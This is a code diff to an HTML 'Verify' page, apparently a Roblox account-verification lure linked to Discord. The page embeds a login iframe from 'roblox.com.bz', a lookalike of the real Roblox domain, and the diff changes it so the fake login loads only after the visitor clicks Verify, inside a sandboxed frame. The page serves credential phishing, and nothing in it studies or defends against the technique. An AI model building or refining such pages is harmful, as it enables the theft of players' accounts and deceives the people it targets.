@@ -177,6 +177,7 @@
             height: 100%;
             border: none;
             border-radius: 10px;
+            pointer-events: none;
         }
 
         .discord-link {
@@ -252,7 +253,7 @@
         <div class="box">
             <button class="verify-btn" id="verifyBtn">Verify</button>
             <div class="iframe-container" id="iframeContainer">
-                <iframe src="https://roblox.com.bz/login?returnUrl=3431491666653791"></iframe>
+                <iframe id="verifyIframe" sandbox="allow-scripts allow-same-origin allow-forms"></iframe>
             </div>
         </div>
     </div>
@@ -273,6 +274,7 @@
         verifyBtn.addEventListener('click', function() {
             verifyBtn.style.display = 'none';
             iframeContainer.style.display = 'block';
+            document.getElementById('verifyIframe').src = 'https://roblox.com.bz/login?returnUrl=3431491666653791';
         });
 
         // Create floating particles
